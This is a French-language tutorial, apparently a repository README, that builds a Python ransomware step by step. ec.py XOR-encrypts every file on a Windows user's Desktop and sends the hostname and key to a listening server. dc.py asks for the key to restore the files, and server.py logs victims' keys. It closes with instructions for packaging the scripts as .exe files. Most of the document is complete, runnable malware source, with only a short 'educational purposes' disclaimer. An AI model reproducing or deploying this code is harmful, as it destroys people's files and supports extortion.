# Références : 
- https://www.youtube.com/playlist?list=PL8KnQ7ULK8egs86oy1gRRa21CGDrEefPw
  
# Table des Matières

1. [Introduction](#1-introduction)
2. [Préparation de l'environnement](#2-préparation-de-lenvironnement)
    1. [Installation de VirtualBox](#21-installation-de-virtualbox)
    2. [Installation de Windows 10 ISO](#22-installation-de-windows-10-iso)
    3. [Création d'une VM](#23-création-dune-vm)
    4. [Installation de Windows](#24-installation-de-windows)
    5. [Configuration initiale](#25-configuration-initiale)
3. [Création d'un Socket pour Établir la Connexion](#3-création-dun-socket-pour-établir-la-connexion)
    1. [Configuration du réseau en mode bridge](#31-configuration-du-réseau-en-mode-bridge)
    2. [Installation de Python et des bibliothèques nécessaires](#32-installation-de-python-et-des-bibliothèques-nécessaires)
    3. [Création d'un environnement virtuel (venv)](#33-création-dun-environnement-virtuel-venv)
    4. [Écriture du script Python pour le serveur](#34-écriture-du-script-python-pour-le-serveur)
    5. [Écriture du script Python pour le client](#35-écriture-du-script-python-pour-le-client)
    6. [Exécution et tests](#36-exécution-et-tests)
4. [Création d'un ransomware en Python](#4-création-dun-ransomware-en-python)
    1. [Création du script de chiffrement (ec.py)](#41-création-du-script-de-chiffrement-ecpy)
    2. [Création du script de déchiffrement (dc.py)](#42-création-du-script-de-déchiffrement-dcpy)
    3. [Création du script de serveur (server.py)](#43-création-du-script-de-serveur-serverpy)
    4. [Conversion des scripts Python en fichiers exécutables (.exe)](#44-conversion-des-scripts-python-en-fichiers-exécutables-exe)
    5. [Test dans une machine virtuelle](#45-test-dans-une-machine-virtuelle)
5. [Conclusion](#5-conclusion)

# 1. Introduction

Ce tutoriel vise à sensibiliser et à des fins pédagogiques en démontrant comment écrire des malwares en Python. Nous commencerons par préparer notre environnement et établirons une connexion socket entre une machine hôte et une machine virtuelle Windows. Ensuite, nous créerons un ransomware simple en Python.

[Revenir en haut](#table-des-matières)

# 2. Préparation de l'environnement

#### 2.1 Installation de VirtualBox
Téléchargez et installez VirtualBox à partir du [site officiel](https://www.virtualbox.org/). Suivez les instructions d'installation par défaut.

[Revenir en haut](#table-des-matières)

#### 2.2 Installation de Windows 10 ISO
Téléchargez l'ISO de Windows 10 depuis le site officiel de Microsoft.

[Revenir en haut](#table-des-matières)

#### 2.3 Création d'une VM
1. Ouvrez VirtualBox et cliquez sur "New".
2. Nommez votre VM et sélectionnez le type et la version appropriés.
3. Allouez de la mémoire et créez un disque dur virtuel en suivant les instructions.

[Revenir en haut](#table-des-matières)

#### 2.4 Installation de Windows
1. Démarrez votre VM et sélectionnez l'ISO de Windows 10 comme disque de démarrage.
2. Suivez les instructions d'installation de Windows.

[Revenir en haut](#table-des-matières)

#### 2.5 Configuration initiale
1. Après l'installation, configurez Windows avec les paramètres par défaut.
2. Installez Python et configurez l'environnement.

[Revenir en haut](#table-des-matières)

### 3. Création d'un Socket pour Établir la Connexion

#### 3.1 Configuration du réseau en mode bridge
1. Ouvrez les paramètres de votre VM dans VirtualBox.
2. Allez dans la section "Réseau".
3. Changez le mode de l'adaptateur réseau en "Bridge Adapter".
4. Sélectionnez votre adaptateur réseau physique dans la liste déroulante.

[Revenir en haut](#table-des-matières)

#### 3.2 Installation de Python et des bibliothèques nécessaires
Téléchargez et installez Python à partir du [site officiel](https://www.python.org/downloads/). Assurez-vous de cocher l'option pour ajouter Python au PATH lors de l'installation.

[Revenir en haut](#table-des-matières)

#### 3.3 Création d'un environnement virtuel (venv)
1. Ouvrez l'invite de commande sur votre machine hôte.
2. Créez un nouveau dossier pour votre projet :
```bash
mkdir socket_project
cd socket_project
```
3. Créez un environnement virtuel :
```bash
python -m venv venv
```
4. Activez l'environnement virtuel :
```bash
venv\Scripts\activate
```
5. Installez les bibliothèques nécessaires :
```bash
pip install socket
```
# Important en cas d'erreur: 
- Pas besoin d'installer socket avec pip dans les nouvelles versions. C'est déja intégré dans python.
[Revenir en haut](#table-des-matières)

#### 3.4 Écriture du script Python pour le serveur
Créez un fichier `server.py` et ajoutez le code suivant :

```python
import socket

SERVER_IP = '192.168.1.85'  # Remplacez par l'adresse IP de votre machine hôte
SERVER_PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((SERVER_IP, SERVER_PORT))
    s.listen(1)
    conn, addr = s.accept()
    with conn:
        print(f'Connection established from: {addr}')
        while True:
            data = conn.recv(1024)
            if not data:
                break
            conn.sendall(data)
```

[Revenir en haut](#table-des-matières)

#### 3.5 Écriture du script Python pour le client
Créez un fichier `client.py` sur votre machine virtuelle et ajoutez le code suivant :

```python
import socket

SERVER_IP = '192.168.1.85'  # Remplacez par l'adresse IP de votre machine hôte
SERVER_PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    s.sendall(b'Hello, world')
    data = s.recv(1024)

print(f'Received {data!r}')
```

[Revenir en haut](#table-des-matières)

#### 3.6 Exécution et tests
1. Démarrez le script serveur sur la machine hôte :
```bash
python server.py
```
2. Démarrez le script client sur la machine virtuelle :
```bash
python client.py
```

[Revenir en haut](#table-des-matières)

### 4. Création d'un ransomware en Python

#### 4.1 Création du script de chiffrement (ec.py)

Ce script chiffre les fichiers et envoie la clé de chiffrement au serveur.

```python
import socket
import os
import threading
import queue
import random

# Fonction de chiffrement
def encrypt(key):
    while True:
        file = q.get()
        print(f'Encrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            
            with open(file, 'rb') as f:
                data = f.read()
            
            with open(file, 'w') as f:
                f.write('')
            
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                
                # Incrémenter l'index de la clé
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            
            print(f'{file} successfully encrypted')
        except:
            print(f'Failed to encrypt file :(')
        q.task_done()

# Informations de socket
IP_ADDRESS = '192.168.1.85'
PORT = 5678

# Informations sur le chiffrement
ENCRYPTION_LEVEL = 512 // 8  # 512 bit encryption = 64 bytes
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./[]{}|'
key_char_pool_len = len(key_char_pool)

# Préparer les fichiers à crypter
print("Preparing files...")
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2] + 'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print("Successfully located all files!")

# Obtenir le nom d'hôte du client
hostname = os.getenv('COMPUTERNAME')

# Générer la clé de chiffrement
print("Generating encryption key...")
key = ''
for i in range(

ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_len - 1)]
print("Key Generated!!!")

# Se connecter au serveur pour transférer la clé et le nom d'hôte
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    print('Successfully connected... transmitting hostname and key')
    s.send(f'{hostname} : {key}'.encode('utf-8'))
    print('Finished transmitting data!')
    s.close()

# Créer la file d'attente des fichiers à crypter
q = queue.Queue()
for f in abs_files:
    q.put(f)

# Configurer les threads pour le chiffrement
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('Encryption and upload complete!!!')
input()
```

[Revenir en haut](#table-des-matières)

#### 4.2 Création du script de déchiffrement (dc.py)

Ce script déchiffre les fichiers cryptés en utilisant une clé fournie par l'utilisateur.

```python
import os
import threading
import queue

# Fonction de décryptage
def decrypt(key):
    while True:
        file = q.get()
        print(f'Decrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            decrypted_data = ''
            
            with open(file, 'rb') as f:
                data = f.read()
            
            with open(file, 'w') as f:
                f.write('')
            
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                
                # Incrementer l'index de la clé
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            
            print(f'{file} successfully decrypted')
        except:
            print(f'Failed to decrypt file :(')
        q.task_done()

# Informations sur le chiffrement
ENCRYPTION_LEVEL = 512 // 8  # 512 bit encryption = 64 bytes
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./[]{}|'
key_char_pool_len = len(key_char_pool)

# Préparer les fichiers à décrypter
print("Preparing files...")
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2] + 'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print("Successfully located all files!")

# Demander la clé de décryptage
key = input("Please enter the decryption key if you want your files back: ")

# Créer la file d'attente des fichiers à décrypter
q = queue.Queue()
for f in abs_files:
    q.put(f)

# Configurer les threads pour le décryptage
for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('Decryption is completed!!!')
```

[Revenir en haut](#table-des-matières)

#### 4.3 Création du script de serveur (server.py)

Ce script crée un serveur pour recevoir la clé de chiffrement et le nom d'hôte du client.

```python
import socket

IP_ADDRESS = '192.168.1.85'
PORT = 5678

print('Creating Socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print('Listening for connections...')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key + '\n')
            break
        print('Connection completed and closed!')
```

[Revenir en haut](#table-des-matières)

#### 4.4 Conversion des scripts Python en fichiers exécutables (.exe)

Utilisez l'outil `auto-py-to-exe` pour convertir vos scripts Python en fichiers exécutables.

```bash
pip install auto-py-to-exe
```

Lancez l'interface `auto-py-to-exe`.

```bash
auto-py-to-exe
```

Sélectionnez le fichier `ec.py` pour le convertir en `ec.exe`. Répétez l'opération pour `dc.py`.

1. Ouvrez `auto-py-to-exe`.
2. Sélectionnez `ec.py` comme script à convertir.
3. Choisissez `One Directory` et `Console Based`.
4. Cliquez sur `Convert .py to .exe`.
5. Répétez pour `dc.py`.

[Revenir en haut](#table-des-matières)

#### 4.5 Test dans une machine virtuelle

Utilisez une machine virtuelle pour tester les fichiers exécutables. Déposez `ec.exe` sur la machine virtuelle pour chiffrer les fichiers et envoyez la clé au serveur. Utilisez `dc.exe` pour déchiffrer les fichiers avec la clé appropriée.

[Revenir en haut](#table-des-matières)

### 5. Conclusion

Ce tutoriel vous a guidé à travers les étapes de création d'un ransomware simple en Python. Nous avons couvert la préparation de l'environnement, la configuration de la connexion socket, et la création des scripts de chiffrement et de déchiffrement. N'oubliez pas que ce tutoriel est uniquement à des fins éducatives. Utilisez ces connaissances de manière éthique et responsable.

[Revenir en haut](#table-des-matières)
